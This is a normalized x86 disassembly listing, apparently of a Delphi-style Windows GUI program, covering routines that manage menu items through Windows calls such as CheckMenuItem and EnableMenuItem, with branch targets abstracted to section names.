cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_434ae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx ebx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436005
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_433b40
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_425570
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_434ae4
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_436174
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_436b60
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4361a4
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4361f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_4363d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40484c
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4361a4
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_436b60
mov esi eax
mov eax edi
call sub_436174
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_405974
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
movzx ebx [ esi + 0x60 ]
jmp r-xdata
movzx esi [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
call sub_4055c8
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_433b40
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
call sub_405864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4363d9
lea eax [ ebp - 0x24 ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_434ae4
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_436404
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_405974
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_405584
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_43642c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4365a0
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_4365b0
cmp ebx eax
je r-xdata
movzx edx [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_436478
sub_436478
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_434a54
push eax
call CheckMenuItem
mov eax esi
call sub_43642c
sub_4364cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_4365a0
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_434a54
push eax
call EnableMenuItem
sub_436544
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_436908
mov edx eax
mov ecx ebx
mov eax edi
call sub_4349f4
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_43642c
sub_4365b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_419898
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_433a94
sub_436620
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4365a0
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_436608
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_43693c
mov ecx ebx
mov edx esi
mov eax edi
call sub_43672c
sub_436668
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4365a0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4365b0
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4366c0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_4365a0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4365b0
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4365b0
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_43672c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_433a94
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x5c ] eax
movzx ecx [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_4349f4
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_419914
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_4369a8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_4365a0
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_434924
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_419898
movzx eax [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_419898
movzx edx [ eax + 0x3f ]
mov eax esi
call sub_436544
sub_4367e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_433a94
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_4365a0
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_434924
mov eax ebx
call sub_4365a0
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_419898
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41978c
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_436858
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
movzx edx [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_436478
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_436588
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_436588
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_436920
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4365a0
mov edx eax
mov ecx esi
mov eax ebx
call sub_43672c
pop esi
pop ebx
retn
sub_43693c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_436908
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_4367e4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_433a94
sub_436964
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_4369a8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_4369a8
jmp r-xdata
mov eax ebx
call sub_434924
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_43892c
sub_436a00
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebx + 0x4c ] eax
sub_436a28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_404650
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_436cc0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40484c
mov edx ebx
mov eax edi
call sub_420098
mov eax ebx
mov si 0xffee
call sub_40484c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_436a98
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ esi + 0x4c ] eax
sub_436acc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4365a0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4365b0
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_436b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_43693c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_436920
jmp r-xdata
mov edx ebx
mov eax esi
call sub_436920
sub_436b70
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_43642c
sub_436b9c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx eax [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_436404
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x69 ]
mov eax esi
call sub_436478
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
call sub_4364cc
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_405584
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_4365f8
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
movzx edx [ edi + 0x6c ]
mov eax esi
call sub_436544
cmp [ esi + 0x3f ] 0x0
jne r-xdata
movzx edx [ edi + 0x84 ]
mov eax esi
call sub_4365d4
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_4365e8
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_436cc0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_436588
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40484c
sub_436ce4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436d04
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436d24
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436d44
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436d64
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436d84
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436da4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436dc4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436de4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436e04
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419f24
movzx edx [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44a8b4
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44a9f0
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44aa50
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44a74c
movzx edx [ ebx + 0x3e ]
mov eax edi
call sub_44ab10
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436e80
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4202f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_436588
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_436a28
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_436ed4
jmp r-xdata
xor edx edx
mov eax esi
call sub_4348ac
sub_436ed4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44910c
mov eax ebx
call sub_436f44
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_449150
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_420098
sub_436f1c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_436f1c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_433f88
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4369a8
mov eax ebx
pop esi
pop ebx
retn
sub_436f58
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40e8cc
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_405a84
sub_436f88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4055c8
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_43700c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43714f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov esi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
inc esi
dec eax
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437156
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405554
retn
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405acc
lea eax [ ebp - 0x14 ]
push eax
mov edx esi
sub edx 0x3
inc edx
mov eax [ ebx ]
mov ecx 0x3
call sub_405a44
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405974
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ ebx ]
movzx edx [ edx + esi - 0x1 ]
mov ecx [ rw-data ]
movzx edx dl
bt [ ecx ] edx
jae r-xdata
push [ ebx ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4058e0
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
sub ecx 0x3
mov eax [ ebx ]
mov edx 0x1
call sub_405a44
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x6
call sub_4058e0
